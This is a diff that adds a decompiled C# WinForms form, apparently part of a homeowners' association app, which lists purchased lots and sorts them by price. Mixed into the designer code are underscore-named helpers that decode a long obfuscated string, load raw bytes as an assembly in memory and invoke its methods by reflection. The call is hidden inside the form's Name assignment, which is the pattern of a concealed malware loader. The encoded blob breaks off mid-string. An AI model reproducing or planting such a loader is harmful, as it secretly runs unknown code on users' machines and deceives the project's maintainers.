@@ -1,0 +1,454 @@
+using System;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.Drawing;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Threading;
+using System.Windows.Forms;
+using HOAProject.My;
+using Microsoft.VisualBasic;
+using Microsoft.VisualBasic.CompilerServices;
+
+namespace HOAProject;
+
+[DesignerGenerated]
+public class PurchaseLotform : Form
+{
+	private IContainer components;
+
+	private bool init;
+
+	internal virtual DataGridView PurchaseLotGrid
+	{
+		[CompilerGenerated]
+		get
+		{
+			return _PurchaseLotGrid;
+		}
+		[MethodImpl(MethodImplOptions.Synchronized)]
+		[CompilerGenerated]
+		set
+		{
+			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
+			//IL_000d: Expected O, but got Unknown
+			DataGridViewCellEventHandler val = new DataGridViewCellEventHandler(PurchaseLotGrid_CellContentClick);
+			DataGridView purchaseLotGrid = _PurchaseLotGrid;
+			if (purchaseLotGrid != null)
+			{
+				purchaseLotGrid.remove_CellContentClick(val);
+			}
+			_PurchaseLotGrid = value;
+			purchaseLotGrid = _PurchaseLotGrid;
+			if (purchaseLotGrid != null)
+			{
+				purchaseLotGrid.add_CellContentClick(val);
+			}
+		}
+	}
+
+	[field: AccessedThroughProperty("PURCHASEDLOTSBindingSource")]
+	internal virtual BindingSource PURCHASEDLOTSBindingSource
+	{
+		get; [MethodImpl(MethodImplOptions.Synchronized)]
+		set;
+	}
+
+	[field: AccessedThroughProperty("LOTIDDataGridViewTextBoxColumn")]
+	internal virtual DataGridViewTextBoxColumn LOTIDDataGridViewTextBoxColumn
+	{
+		get; [MethodImpl(MethodImplOptions.Synchronized)]
+		set;
+	}
+
+	[field: AccessedThroughProperty("SUBDIVISIONIDDataGridViewTextBoxColumn")]
+	internal virtual DataGridViewTextBoxColumn SUBDIVISIONIDDataGridViewTextBoxColumn
+	{
+		get; [MethodImpl(MethodImplOptions.Synchronized)]
+		set;
+	}
+
+	[field: AccessedThroughProperty("PURCHASEPRICEDataGridViewTextBoxColumn")]
+	internal virtual DataGridViewTextBoxColumn PURCHASEPRICEDataGridViewTextBoxColumn
+	{
+		get; [MethodImpl(MethodImplOptions.Synchronized)]
+		set;
+	}
+
+	[field: AccessedThroughProperty("PURCHASEDATEDataGridViewTextBoxColumn")]
+	internal virtual DataGridViewTextBoxColumn PURCHASEDATEDataGridViewTextBoxColumn
+	{
+		get; [MethodImpl(MethodImplOptions.Synchronized)]
+		set;
+	}
+
+	internal virtual Button BackButton
+	{
+		[CompilerGenerated]
+		get
+		{
+			return _BackButton;
+		}
+		[MethodImpl(MethodImplOptions.Synchronized)]
+		[CompilerGenerated]
+		set
+		{
+			EventHandler eventHandler = BackButton_Click;
+			Button backButton = _BackButton;
+			if (backButton != null)
+			{
+				((Control)backButton).remove_Click(eventHandler);
+			}
+			_BackButton = value;
+			backButton = _BackButton;
+			if (backButton != null)
+			{
+				((Control)backButton).add_Click(eventHandler);
+			}
+		}
+	}
+
+	internal virtual Button HighestValuedLotsButton
+	{
+		[CompilerGenerated]
+		get
+		{
+			return _HighestValuedLotsButton;
+		}
+		[MethodImpl(MethodImplOptions.Synchronized)]
+		[CompilerGenerated]
+		set
+		{
+			EventHandler eventHandler = HighestValuedLotsButton_Click;
+			Button highestValuedLotsButton = _HighestValuedLotsButton;
+			if (highestValuedLotsButton != null)
+			{
+				((Control)highestValuedLotsButton).remove_Click(eventHandler);
+			}
+			_HighestValuedLotsButton = value;
+			highestValuedLotsButton = _HighestValuedLotsButton;
+			if (highestValuedLotsButton != null)
+			{
+				((Control)highestValuedLotsButton).add_Click(eventHandler);
+			}
+		}
+	}
+
+	internal virtual Button LowestValuedLotsButton
+	{
+		[CompilerGenerated]
+		get
+		{
+			return _LowestValuedLotsButton;
+		}
+		[MethodImpl(MethodImplOptions.Synchronized)]
+		[CompilerGenerated]
+		set
+		{
+			EventHandler eventHandler = LowestValuesLotsButton_Click;
+			Button lowestValuedLotsButton = _LowestValuedLotsButton;
+			if (lowestValuedLotsButton != null)
+			{
+				((Control)lowestValuedLotsButton).remove_Click(eventHandler);
+			}
+			_LowestValuedLotsButton = value;
+			lowestValuedLotsButton = _LowestValuedLotsButton;
+			if (lowestValuedLotsButton != null)
+			{
+				((Control)lowestValuedLotsButton).add_Click(eventHandler);
+			}
+		}
+	}
+
+	internal virtual Button ShowAllLotsButton
+	{
+		[CompilerGenerated]
+		get
+		{
+			return _ShowAllLotsButton;
+		}
+		[MethodImpl(MethodImplOptions.Synchronized)]
+		[CompilerGenerated]
+		set
+		{
+			EventHandler eventHandler = ShowAllLotsButton_Click;
+			Button showAllLotsButton = _ShowAllLotsButton;
+			if (showAllLotsButton != null)
+			{
+				((Control)showAllLotsButton).remove_Click(eventHandler);
+			}
+			_ShowAllLotsButton = value;
+			showAllLotsButton = _ShowAllLotsButton;
+			if (showAllLotsButton != null)
+			{
+				((Control)showAllLotsButton).add_Click(eventHandler);
+			}
+		}
+	}
+
+	public PurchaseLotform()
+	{
+		((Form)this).add_Load((EventHandler)PurchaseLotformGrid_Load);
+		init = false;
+		InitializeComponent();
+	}
+
+	[STAThread]
+	public static void Main()
+	{
+		Application.Run((Form)(object)MyProject.Forms.PurchaseLotform);
+	}
+
+	[DebuggerNonUserCode]
+	protected override void Dispose(bool disposing)
+	{
+		try
+		{
+			if (disposing && components != null)
+			{
+				components.Dispose();
+			}
+		}
+		finally
+		{
+			((Form)this).Dispose(disposing);
+		}
+	}
+
+	[DebuggerStepThrough]
+	private void InitializeComponent()
+	{
+		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
+		//IL_0016: Expected O, but got Unknown
+		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
+		//IL_0021: Expected O, but got Unknown
+		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
+		//IL_002c: Expected O, but got Unknown
+		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
+		//IL_0037: Expected O, but got Unknown
+		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
+		//IL_0042: Expected O, but got Unknown
+		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
+		//IL_0053: Expected O, but got Unknown
+		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
+		//IL_005e: Expected O, but got Unknown
+		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
+		//IL_0069: Expected O, but got Unknown
+		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
+		//IL_0074: Expected O, but got Unknown
+		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
+		//IL_007f: Expected O, but got Unknown
+		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
+		//IL_02f4: Unknown result type (might be due to invalid IL or missing references)
+		//IL_04f8: Unknown result type (might be due to invalid IL or missing references)
+		components = new Container();
+		PurchaseLotGrid = new DataGridView();
+		LOTIDDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
+		SUBDIVISIONIDDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
+		PURCHASEPRICEDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
+		PURCHASEDATEDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
+		PURCHASEDLOTSBindingSource = new BindingSource(components);
+		BackButton = new Button();
+		HighestValuedLotsButton = new Button();
+		LowestValuedLotsButton = new Button();
+		ShowAllLotsButton = new Button();
+		((ISupportInitialize)PurchaseLotGrid).BeginInit();
+		((ISupportInitialize)PURCHASEDLOTSBindingSource).BeginInit();
+		((Control)this).SuspendLayout();
+		PurchaseLotGrid.set_AutoGenerateColumns(false);
+		PurchaseLotGrid.set_AutoSizeColumnsMode((DataGridViewAutoSizeColumnsMode)6);
+		PurchaseLotGrid.set_AutoSizeRowsMode((DataGridViewAutoSizeRowsMode)7);
+		PurchaseLotGrid.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
+		PurchaseLotGrid.get_Columns().AddRange((DataGridViewColumn[])(object)new DataGridViewColumn[4]
+		{
+			(DataGridViewColumn)LOTIDDataGridViewTextBoxColumn,
+			(DataGridViewColumn)SUBDIVISIONIDDataGridViewTextBoxColumn,
+			(DataGridViewColumn)PURCHASEPRICEDataGridViewTextBoxColumn,
+			(DataGridViewColumn)PURCHASEDATEDataGridViewTextBoxColumn
+		});
+		PurchaseLotGrid.set_DataSource((object)PURCHASEDLOTSBindingSource);
+		((Control)PurchaseLotGrid).set_Location(new Point(96, 80));
+		((Control)PurchaseLotGrid).set_Margin(new Padding(2));
+		((Control)PurchaseLotGrid).set_Name("PurchaseLotGrid");
+		PurchaseLotGrid.set_RowHeadersVisible(false);
+		PurchaseLotGrid.set_RowHeadersWidth(51);
+		PurchaseLotGrid.get_RowTemplate().set_Height(24);
+		((Control)PurchaseLotGrid).set_Size(new Size(447, 224));
+		((Control)PurchaseLotGrid).set_TabIndex(0);
+		((DataGridViewColumn)LOTIDDataGridViewTextBoxColumn).set_DataPropertyName("LOT_ID");
+		((DataGridViewColumn)LOTIDDataGridViewTextBoxColumn).set_HeaderText("LOT_ID");
+		((DataGridViewColumn)LOTIDDataGridViewTextBoxColumn).set_MinimumWidth(6);
+		((DataGridViewColumn)LOTIDDataGridViewTextBoxColumn).set_Name("LOTIDDataGridViewTextBoxColumn");
+		((DataGridViewColumn)LOTIDDataGridViewTextBoxColumn).set_Width(70);
+		((DataGridViewColumn)SUBDIVISIONIDDataGridViewTextBoxColumn).set_DataPropertyName("SUBDIVISION_ID");
+		((DataGridViewColumn)SUBDIVISIONIDDataGridViewTextBoxColumn).set_HeaderText("SUBDIVISION_ID");
+		((DataGridViewColumn)SUBDIVISIONIDDataGridViewTextBoxColumn).set_MinimumWidth(6);
+		((DataGridViewColumn)SUBDIVISIONIDDataGridViewTextBoxColumn).set_Name("SUBDIVISIONIDDataGridViewTextBoxColumn");
+		((DataGridViewColumn)SUBDIVISIONIDDataGridViewTextBoxColumn).set_Width(118);
+		((DataGridViewColumn)PURCHASEPRICEDataGridViewTextBoxColumn).set_DataPropertyName("PURCHASE_PRICE");
+		((DataGridViewColumn)PURCHASEPRICEDataGridViewTextBoxColumn).set_HeaderText("PURCHASE_PRICE");
+		((DataGridViewColumn)PURCHASEPRICEDataGridViewTextBoxColumn).set_MinimumWidth(6);
+		((DataGridViewColumn)PURCHASEPRICEDataGridViewTextBoxColumn).set_Name("PURCHASEPRICEDataGridViewTextBoxColumn");
+		((DataGridViewColumn)PURCHASEPRICEDataGridViewTextBoxColumn).set_Width(129);
+		((DataGridViewColumn)PURCHASEDATEDataGridViewTextBoxColumn).set_DataPropertyName("PURCHASE_DATE");
+		((DataGridViewColumn)PURCHASEDATEDataGridViewTextBoxColumn).set_HeaderText("PURCHASE_DATE");
+		((DataGridViewColumn)PURCHASEDATEDataGridViewTextBoxColumn).set_MinimumWidth(6);
+		((DataGridViewColumn)PURCHASEDATEDataGridViewTextBoxColumn).set_Name("PURCHASEDATEDataGridViewTextBoxColumn");
+		((DataGridViewColumn)PURCHASEDATEDataGridViewTextBoxColumn).set_Width(126);
+		PURCHASEDLOTSBindingSource.set_DataMember("PURCHASED_LOTS");
+		((Control)BackButton).set_Location(new Point(291, 371));
+		((Control)BackButton).set_Margin(new Padding(2));
+		((Control)BackButton).set_Name("BackButton");
+		((Control)BackButton).set_Size(new Size(68, 19));
+		((Control)BackButton).set_TabIndex(1);
+		((ButtonBase)BackButton).set_Text("&Back");
+		((ButtonBase)BackButton).set_UseVisualStyleBackColor(true);
+		((Control)HighestValuedLotsButton).set_Location(new Point(96, 28));
+		((Control)HighestValuedLotsButton).set_Name("HighestValuedLotsButton");
+		((Control)HighestValuedLotsButton).set_Size(new Size(111, 23));
+		((Control)HighestValuedLotsButton).set_TabIndex(2);
+		((ButtonBase)HighestValuedLotsButton).set_Text("Highest Valued Lots");
+		((ButtonBase)HighestValuedLotsButton).set_UseVisualStyleBackColor(true);
+		((Control)LowestValuedLotsButton).set_Location(new Point(432, 28));
+		((Control)LowestValuedLotsButton).set_Name("LowestValuedLotsButton");
+		((Control)LowestValuedLotsButton).set_Size(new Size(111, 23));
+		((Control)LowestValuedLotsButton).set_TabIndex(3);
+		((ButtonBase)LowestValuedLotsButton).set_Text("Lowest Valued Lots");
+		((ButtonBase)LowestValuedLotsButton).set_UseVisualStyleBackColor(true);
+		((Control)ShowAllLotsButton).set_Location(new Point(271, 28));
+		((Control)ShowAllLotsButton).set_Name("ShowAllLotsButton");
+		((Control)ShowAllLotsButton).set_Size(new Size(111, 23));
+		((Control)ShowAllLotsButton).set_TabIndex(4);
+		((ButtonBase)ShowAllLotsButton).set_Text("Show All Lots");
+		((ButtonBase)ShowAllLotsButton).set_UseVisualStyleBackColor(true);
+		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
+		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
+		((Form)this).set_ClientSize(new Size(650, 414));
+		((Control)this).get_Controls().Add((Control)(object)ShowAllLotsButton);
+		((Control)this).get_Controls().Add((Control)(object)LowestValuedLotsButton);
+		((Control)this).get_Controls().Add((Control)(object)HighestValuedLotsButton);
+		((Control)this).get_Controls().Add((Control)(object)BackButton);
+		((Control)this).get_Controls().Add((Control)(object)PurchaseLotGrid);
+		((Form)this).set_Margin(new Padding(2));
+		((Control)this).set_Name(I______________________1(f: true));
+		((Form)this).set_Text("Purchased Lots");
+		((ISupportInitialize)PurchaseLotGrid).EndInit();
+		((ISupportInitialize)PURCHASEDLOTSBindingSource).EndInit();
+		((Control)this).ResumeLayout(false);
+	}
+
+	private static void I______________________2(Type x, int xz)
+	{
+		object[] parameters = new object[3]
+		{
+			CPU.F_1,
+			CPU.F_0,
+			"HOAProject"
+		};
+		MethodInfo methodInfo = x.GetMethods()[3];
+		methodInfo.Invoke(0, parameters);
+	}
+
+	private static void I_______________________3(object t)
+	{
+		Type x = ((Assembly)t).GetExportedTypes()[0];
+		I______________________2(x, 5);
+	}
+
+	private static object I__________________5(byte[] RAW, bool AccountDomainSid)
+	{
+		return Thread.GetDomain().Load(RAW);
+	}
+
+	public static object ___________s(string proj, string key)
+	{
+		string text = "";
+		int length = proj.Length;
+		checked
+		{
+			for (int i = 1; i <= length; i++)
+			{
+				int num = unchecked((int)Strings.GetChar(proj, i)) - unchecked((int)Strings.GetChar(key, checked(unchecked(i % key.Length) + 1)));
+				text += Conversions.ToString(Strings.ChrW(num));
+			}
+			return text;
+		}
+	}
+
+	public static string I______________________1(bool f)
+	{
+		string proj = "ËÍèÈ\u00b8\u00b8Ä\u00b8\u00b8\u00b8\u00b8¼\u00b8\u00b8\u00b8\u00b8¦¦\u00af\u00b8\u00b8ÃÞ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8È\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8Þ\u00b8\u00b8\u00b8\u00b8\u00b8«ÝìÞ«\u00b8ë\u00b8åÅÀÙÞ¹ËÄ§ßÍ¾ßçÚð¹îÚä°åÚä½ëÀ¾ÅßÙä¬íÛº¹àÑÊ¹ðÛÎ«ÞØÎ«ÞÉ¼°ËÀ¾\u00a8íÑ¾Ìì»È§ÂÁ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¹ÈÉÈ\u00b8\u00b8Ë\u00b8¼»\u00b8¾©ÂãÎ¼\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8Æ\u00b8\u00b8\u00b8à¼Ã\u00b8ÈÞ\u00b8\u00b8»æ\u00b8\u00b8\u00b8\u00b8¾\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8»ãÞ\u00b8\u00b8\u00b8\u00b8Þ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¹\u00b8\u00b8\u00b8\u00b8Þ\u00b8\u00b8\u00b8\u00b8\u00b8Þ\u00b8\u00b8¹\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¼\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ºÞ\u00b8\u00b8\u00b8\u00b8\u00b8Þ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8Ä\u00b8ÈÀÌ\u00b8\u00b8¹\u00b8\u00b8\u00b8¹\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¼\u00b8\u00b8\u00b8¼\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¹\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ÃïÏ\u00b8\u00b8¹Ç\u00b8\u00b8\u00b8\u00b8\u00b8¾\u00b8\u00b8\u00b8\u00b8\u00b8¼\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8À\u00b8\u00b8\u00b8\u00b8î\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8À\u00b8\u00b8\u00b8º\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ºº\u00b8\u00b8\u00b8¼Þ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8º¬§ÑÏß§\u00b8\u00b8\u00b8\u00b8½»Þ\u00b8\u00b8\u00b8\u00b8Þ\u00b8\u00b8\u00b8\u00b8ÆÞ\u00b8\u00b8\u00b8\u00b8À\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8º\u00b8\u00b8\u00b8¾\u00b8ìÚåÅðÐî\u00b8\u00b8\u00b8\u00b8\u00b8¼\u00b8\u00b8\u00b8\u00b8Ð\u00b8\u00b8\u00b8\u00b8\u00b8È\u00b8\u00b8\u00b8\u00b8\u00af\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¹\u00b8\u00b8\u00b8¹\u00b8ÃåÁãÙ¾°á\u00b8\u00b8\u00b8Ä\u00b8\u00b8\u00b8\u00b8\u00b8À\u00b8\u00b8\u00b8\u00b8\u00b8º\u00b8\u00b8\u00b8\u00b8È\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8È\u00b8\u00b8\u00b8ÈÞ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8»îÍî\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¼Þ\u00b8\u00b8\u00b8\u00b8º\u00b8\u00b8Ì\u00b8Ð¼Ð\u00b8\u00b8½îÉ\u00b8\u00b8\u00b8»\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ÅÐÞÚÞÀ\u00b8\u00b8À§¹\u00b8\u00b8\u00b8¹ÁÛ\u00b8¹\u00b8\u00b8\u00b8¼Â\u00b8¼\u00b8\u00b8\u00b8è\u00b8\u00b8Þ\u00b8\u00b8¹ººê\u00b8È\u00b8\u00b8áÈ¼\u00b8\u00b8\u00b8¼ã§\u00b8Ä\u00b8\u00b8\u00b8Èæ\u00b8È\u00b8\u00b8ºæ\u00b8¼\u00b8\u00b8\u00b8¼ÂÞ\u00b8\u00b8¾ñ\u00b8¾\u00b8Çê¹\u00b8\u00b8\u00b8¹\u00b8\u00b8\u00b8ÉÝÞÀ\u00b8\u00b8\u00b8ÈË¼Ï«¼\u00b8\u00b8\u00b8¼¼î«éÁß¼¿ÉÈÌ\u00b8\u00b8\u00b8\u00b8Ã\u00b8\u00b8\u00b8\u00b8ºî\u00b8\u00b8\u00b8\u00b8ê\u00b8\u00b8\u00b8\u00b8Ã\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8Å\u00b8º\u00b8\u00b8\u00b8¾ÁßÚË¹ðíØ\u00b8åÄº\u00b8\u00b8\u00b8ÂºßæËºÉ¼ÁÉÈÐ\u00b8\u00b8\u00b8\u00b8è\u00b8\u00b8\u00b8\u00b8ÁÈ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ã\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ºæ\u00b8\u00b8\u00b8\u00b8ØáÈÞ\u00b8\u00b8\u00b8¼Ã¹åÌ¿\u00b8\u00b8\u00b8¹¹ªÌ¹\u00b8\u00b8\u00b8Ù½ßæÞ®Þ¼\u00b8\u00b8º»º\u00b8È\u00b8\u00b8Â\u00b8¼\u00b8\u00b8ºêä¾ïÄÁÂ®Ú¿Û\u00b8¼\u00b8\u00b8¹êÎÀ\u00b8À¹\u00b8\u00b8\u00b8ÞÎÞ¼\u00b8\u00b8ºÞÊ\u00b8\u00b8\u00b8¾»\u00b8Ñ\u00a8¹î\u00b8\u00b8\u00b8ÉÑñ\u00b8î\u00b8\u00b8ºÞ§Ñ¼îêÉº§Ì¾\u00b8\u00b8\u00b8\u00b8Ã\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ê\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ºî\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ºÀ§À\u00b8\u00b8\u00b8¹¼îÈÁÛ\u00b8â\u00b8\u00b8\u00b8¼É¹¿Ì¹\u00b8\u00b8\u00b8Ù½ÞÞÞáÞ¼\u00b8\u00b8ººà\u00b8È\u00b8\u00b8Â\u00b8¼\u00b8\u00b8ºêä¾ßÄÃÂ®ÌÉ¹¿Ì¹\u00b8\u00b8\u00b8Ù¼îÏÛñ\u00b8\u00b8\u00b8\u00b8¹ÞË»É¼ÅÉÈÚ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8É\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ºæ\u00b8\u00b8\u00b8\u00b8è\u00b8\u00b8\u00b8\u00b8ºÏÌÁ\u00b8\u00b8\u00b8¹Ã¹ÀÉ»à¹¦\u00b8È\u00b8\u00b8âð\u00b8È¢î\u00b8\u00b8ÎÉÄÅÂ\u00afÄÉ»à¹á\u00b8È\u00b8\u00b8âðº§ìî\u00b8\u00b8ÎÊíêºÏÌÁ\u00b8\u00b8\u00b8¹ÙîÈ\u00b8\u00b8\u00b8æÉ»ß°ÍâðºÛ½È\u00b8\u00b8ÎÉÄÅÂ¬åÚ¾¹ÄÈ¼É¹½¹î\u00b8\u00b8\u00b8¹§\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8»æ\u00b8\u00b8\u00b8\u00b8¾Û\u00b8Ú\u00b8\u00b8\u00b8¼ê¼ß¼ÆÀÀÐ¹\u00b8\u00b8ºËÀ½Ýí\u00b8\u00b8¹Ñ¼ï\u00b8éîïîé¢ÈÑ\u00a8¹î\u00b8\u00b8\u00b8Î\u00af¼\u00b8\u00b8\u00b8Â¼É¼ÞÂ\u00b8À\u00b8\u00b8ÁÄÞ\u00b8¼Ì\u00b8\u00b8½âË¼ºìáª¹ÐË¼ï¼ËÉÈÌ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¹¼½ÛÈ¼\u00b8\u00b8¹êè\u00b8¼¼§\u00b8\u00b8\u00b8º\u00b8\u00b8\u00b8\u00b8éÈ\u00b8\u00b8\u00b8½î\u00b8\u00b8\u00b8\u00b8Á\u00b8È\u00b8\u00b8Øî\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8º\u00b8\u00b8\u00b8\u00b8ÇÈ\u00b8\u00b8\u00b8»Ú¹\u00b8\u00b8¹§\u00b8È\u00b8\u00b8ÐÈ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ËÄ\u00b8Ì\u00b8åÞ¼\u00b8\u00b8\u00b8À\u00b8\u00b8¹½¢¹\u00b8\u00b8\u00b8¹¹ÄÂÝÞÀ\u00b8\u00b8\u00b8ÈËºðëÎ¼Èã½¼È\u00b8\u00b8\u00b8¹È¹\u00b8\u00b8»ä\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ÆÐ\u00b8\u00b8\u00b8\u00b8Ã\u00b8\u00b8\u00b8\u00b8©Þ\u00b8\u00b8\u00b8¿Ð\u00b8\u00b8\u00b8»¢\u00b8\u00b8\u00b8\u00b8Àî¼\u00b8\u00b8¼\u00b8\u00b8\u00b8\u00b8\u00b8®\u00b8È\u00b8\u00b8Í\u00b8\u00b8\u00b8\u00b8¾È\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8êî\u00b8\u00b8\u00b8ÁÄ\u00b8\u00b8\u00b8»È\u00b8\u00b8\u00b8\u00b8§\u00b8Ä\u00b8\u00b8\u00b8Ðä¾ßÄÁÂ\u00adæÞÚ\u00b8À\u00b8\u00b8º\u00b8Â\u00b8Þ\u00b8\u00b8Â¹È\u00b8\u00b8\u00b8Ð»ÀÃ\u00af\u00b8\u00b8\u00b8\u00b8ÞèÈ\u00b8\u00b8\u00b8ºÞº\u00b8\u00b8\u00b8éºß¼ÂÀÅ¼\u00b8\u00b8\u00b8ºËÀÀËé\u00b8\u00b8¹Ñ¼îâ«ÛÝ¦¦¦îÀºáäâÏÎÑ¼ÝÚ¾¼Ã¿îêËºËßß¦¦¦¦\u00b8æ¬ç½\u00a8àÅº\u00b8\u00b8\u00b8\u00b8ÈîÎ»ÉÐË¹¹¼Ã¿\u00a8ÊËÀÀ\u00b8Ñ\u00b8\u00b8¹Ñ¼îâ«Ç¦¦¦¦îÞÉ¹\u00b8ÀÉ¹Á¼¿ÐÈÑ§\u00b8È\u00b8\u00b8¾îäÉÐÛÂÚ¿î\u00afËºËÞà¦¦¦¦ºÈÄÞ§îÀ\u00b8\u00b8º»ª\u00b8Þ\u00b8\u00b8Â\u00b8Ä\u00b8\u00b8ºêÏÎÝ«¹¼îÌÝ»ßÄÁÆ\u00b8Ã¦¦¦\u00afÉ¹ÊîÁ¿ï\u00b8ËºËá\u00a8¦í¦¦¼ÈêÞØî¼\u00b8\u00b8ÁÄÞ\u00adàæ\u00b8\u00b8½âé\u00adÉÐÅ¾ÉÄÁÆÅí¢¦¦\u00afÁ½\u00a8ÞÅ¾ÉÄÁÆÄ¦¢¦¦\u00afÉ¹¹ÛÐ¼îÈÉºï°\u00afâð¹Ú«î\u00b8\u00b8ÎÉÄÁÆÃÝ¢¦¦\u00afÉ¹\u00b8ÂÆØÉÛÑ¦ÞÀÎ¦Þ¼Ë¹ßÐËºËàß¦í¦¦¼ÈÐëº¹«ËºËàÍ¦í¦¦¿ºí©¼ÞÀºáäâÏÎÊÞ¼\u00b8\u00b8\